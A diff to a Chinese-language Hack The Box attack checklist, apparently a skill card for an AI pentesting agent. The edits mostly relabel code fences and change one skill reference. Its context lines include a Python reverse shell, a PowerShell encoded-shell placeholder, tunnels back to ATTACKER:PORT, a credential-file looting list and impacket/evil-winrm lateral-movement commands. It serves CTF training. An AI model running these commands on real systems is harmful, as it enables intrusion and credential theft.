@@ -4,7 +4,7 @@ description: 'HTB 按领域速查索引：题型信号/Web/CMS/反弹Shell/提�
 whenToUse: '按领域快速翻攻击清单时；完整执行流改用 htb-methodology'
 metadata: { domain: meta, tier: T1 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 # HTB 综合攻击检查表（按领域速查索引）
 
@@ -20,7 +20,7 @@ metadata: { domain: meta, tier: T1 }
 |------|------|------|
 | KDS Root Key 存在 | BadSuccessor/BetterSuccessor | ad-type-recognition |
 | NTLM 全失败，Kerberos 成功 | Kerberos-Only AD | kerberos-only-ad |
-| 多域 `nltest /domain_trusts` | 跨林攻击 | kerberos-only-ad |
+| 多域 `nltest /domain_trusts` | 跨林攻击 | sid-history-injection |
 | .vmem/.vmdk/.vhd 文件 | VM 取证 | ad-checklist#6 |
 | MSSQL 端口 1433/1434 | MSSQL 攻击链 | mssql-attack-chain |
 | ADCS HTTP 端点 | ESC1-16 | adcs-attack-chain |
@@ -72,7 +72,7 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));os.dup
 
 # Windows (PowerShell)
 powershell -e <base64_encoded_reverse_shell>
-```
+```text
 
 > 🔴 获 shell 后立即执行序列（env/config/内网服务/flag）→ htb-methodology 卡（阶段3 横向）
 > 🔴 监听端 PTY 纪律（socat/nc + 等待策略）→ htb-methodology 卡
@@ -130,7 +130,7 @@ bloodhound-python -d domain -u user -p pass -c All
 
 # MSSQL → mssql-attack-chain
 # ADCS → adcs-attack-chain
-```
+```text
 
 ---
 
@@ -150,7 +150,7 @@ bloodhound-python -d domain -u user -p pass -c All
 | WPA2 handshake (.22000) | WPA2 | 22000 |
 
 ### 常见凭据源
-```
+```text
 [ ] ConsoleHost_history.txt (PowerShell)
 [ ] .git/config, .git-credentials
 [ ] *.conf, *.properties, *.env, *.ini, *.xml
@@ -163,13 +163,13 @@ bloodhound-python -d domain -u user -p pass -c All
 [ ] Firefox logins.json, Chrome Login Data
 [ ] KeePass .kdbx → keepass2john
 [ ] SQLite/MySQL DB → dump
-```
+```text
 
 ---
 
 ## 横向移动速查（横向移动）
 
-```
+```text
 [ ] WinRM: evil-winrm -i TARGET -u user -p pass
 [ ] PsExec: impacket-psexec domain/user:pass@TARGET
 [ ] WMI: impacket-wmiexec domain/user:pass@TARGET
@@ -180,7 +180,7 @@ bloodhound-python -d domain -u user -p pass -c All
 [ ] SSH tunnel: ssh -D 1080 user@target → proxychains
 [ ] Ligolo-ng: /tmp/agent -connect ATTACKER:PORT -ignore-cert
 [ ] chisel: ./chisel client ATTACKER:PORT R:socks
-```
+```text
 
 > 🔴 横向移动决策树 + 反模式 → lateral-movement 技能；内网服务 fuzz → unknown-service-probe 技能
 
